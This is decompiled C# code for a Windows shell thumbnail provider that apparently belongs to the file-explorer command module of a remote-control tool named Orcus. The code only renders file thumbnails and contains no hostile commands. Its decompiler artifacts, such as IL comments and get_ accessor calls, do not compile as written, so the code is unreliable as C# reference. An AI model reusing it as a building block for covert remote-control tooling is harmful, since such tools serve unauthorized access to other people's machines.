using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using Orcus.Native;
using Orcus.Native.Shell;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.FileExplorer;

public class WindowsThumbnailProvider
{
	private const string IShellItem2Guid = "7E9FB0D3-919F-4307-AB2E-9B1860310C93";

	public static Bitmap GetThumbnail(string fileName, int width, int height, ThumbnailOptions options)
	{
		IntPtr hBitmap = GetHBitmap(Path.GetFullPath(fileName), width, height, options);
		try
		{
			return GetBitmapFromHBitmap(hBitmap);
		}
		finally
		{
			NativeMethods.DeleteObject(hBitmap);
		}
	}

	private static Bitmap GetBitmapFromHBitmap(IntPtr nativeHBitmap)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		Bitmap val = Image.FromHbitmap(nativeHBitmap);
		if (Image.GetPixelFormatSize(((Image)val).get_PixelFormat()) < 32)
		{
			return val;
		}
		return CreateAlphaBitmap(val, (PixelFormat)2498570);
	}

	private unsafe static Bitmap CreateAlphaBitmap(Bitmap srcBitmap, PixelFormat targetPixelFormat)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		Bitmap val = new Bitmap(((Image)srcBitmap).get_Width(), ((Image)srcBitmap).get_Height(), targetPixelFormat);
		Rectangle rectangle = new Rectangle(0, 0, ((Image)srcBitmap).get_Width(), ((Image)srcBitmap).get_Height());
		BitmapData val2 = srcBitmap.LockBits(rectangle, (ImageLockMode)1, ((Image)srcBitmap).get_PixelFormat());
		BitmapData val3 = val.LockBits(rectangle, (ImageLockMode)1, targetPixelFormat);
		byte* ptr = (byte*)(void*)val2.get_Scan0();
		byte* ptr2 = (byte*)(void*)val3.get_Scan0();
		try
		{
			for (int i = 0; i <= val2.get_Height() - 1; i++)
			{
				for (int j = 0; j <= val2.get_Width() - 1; j++)
				{
					int num = val2.get_Stride() * i + 4 * j;
					int num2 = val3.get_Stride() * i + 4 * j;
					CoreMemoryApi.memcpy((void*)(ptr2 + num2), (void*)(ptr + num), (UIntPtr)4uL);
				}
			}
		}
		finally
		{
			srcBitmap.UnlockBits(val2);
			val.UnlockBits(val3);
		}
		try
		{
			return val;
		}
		finally
		{
			((IDisposable)srcBitmap)?.Dispose();
		}
	}

	private static IntPtr GetHBitmap(string fileName, int width, int height, ThumbnailOptions options)
	{
		Guid riid = new Guid("7E9FB0D3-919F-4307-AB2E-9B1860310C93");
		IShellItem shellItem;
		int num = NativeMethods.SHCreateItemFromParsingName(fileName, IntPtr.Zero, ref riid, out shellItem);
		if (num != 0)
		{
			throw Marshal.GetExceptionForHR(num);
		}
		NativeSize size = default(NativeSize);
		size.Width = width;
		size.Height = height;
		IntPtr phbm;
		HResult image = ((IShellItemImageFactory)shellItem).GetImage(size, options, out phbm);
		Marshal.ReleaseComObject(shellItem);
		if (image != 0)
		{
			throw Marshal.GetExceptionForHR((int)image);
		}
		return phbm;
	}
}
